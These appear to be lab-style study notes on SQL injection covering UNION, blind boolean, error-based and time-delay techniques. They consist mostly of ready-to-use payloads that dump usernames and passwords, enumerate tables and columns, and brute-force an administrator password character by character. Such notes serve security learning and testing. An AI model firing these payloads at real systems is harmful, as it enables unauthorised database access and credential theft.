# SQL Injection

## Definition

Web security vulnerability that allows interfering with database queries.

## Common Locations

- `WHERE` clause in `SELECT`
    
- `UPDATE` statements (values/`WHERE`)
    
- `INSERT` statements (values)
    
- `SELECT` (table/column names)
    
- `SELECT` (`ORDER BY` clause)
    

## Basic Examples

Original:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Injected:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' -- AND released = 1
```

## UNION Attacks

Append additional queries:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

### Techniques

1. **Find column count**:
    
    ```sql
    ' UNION SELECT NULL--
    ```
    
    (Oracle: `' UNION SELECT NULL FROM DUAL--`)
    
2. **Check column types**:
    
    ```sql
    ' UNION SELECT NULL,'a',NULL,NULL--
    ```
    
3. **Steal data**:
    
    ```sql
    ' UNION SELECT username,password FROM users--
    ```
    
4. **Combine fields**:
    
    ```sql
    ' UNION SELECT username||'~'||password FROM users--
    ```
    

## Database Version

- **MySQL/MSSQL**:
    
    ```sql
    ' UNION SELECT @@version--
    ```
    
- **Oracle**:
    
    ```sql
    ' UNION SELECT * FROM v$version--
    ```
    
- **PostgreSQL**:
    
    ```sql
    ' UNION SELECT version()--
    ```
    

## Database Enumeration

1. **List tables**:
    
    ```sql
    SELECT * FROM information_schema.tables
    ```
    
2. **List columns**:
    
    ```sql
    SELECT * FROM information_schema.columns WHERE table_name='Users'
    ```
    
3. **Practical injection**:
    
    ```sql
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--
    ```
    

---

# Blind SQL Injection

## Definition

Blind SQL Injection is an attack where an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query.

## Common Exploitation Techniques

### Triggering Conditional Responses

```sql
…xyz' AND '1'='1 -- Returns True

…xyz' AND '1'='2 -- Returns False

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm' -- Returns True

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't' -- Returns False

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's' -- Returns True
```

### Finding Password Length

```sql
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) < X)='administrator'--
```

### Bruteforcing Password

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')=''--
```

Use Burp Suite to bruteforce the password with appropriate payloads.

---

# Error-Based SQL Injection

Cases where error messages help extract or infer sensitive data, even in blind contexts.

### Conditional Errors

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' -- No Error

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' -- Error: Divide by zero
```

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
```

This allows testing one character at a time.

### Bruteforcing with Burp Suite

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username = 'administrator' AND SUBSTR(password,$$,1)='$$') || '--
```

## Extracting Sensitive Data from SQL Error Messages

Using `CAST()` as `int` to generate errors:

```sql
' AND CAST((SELECT 1) AS int)-- -- Generates an error

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

# Executing Blind SQL Injection with Time Delays

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--

'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

### Retrieving Password One Character at a Time

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
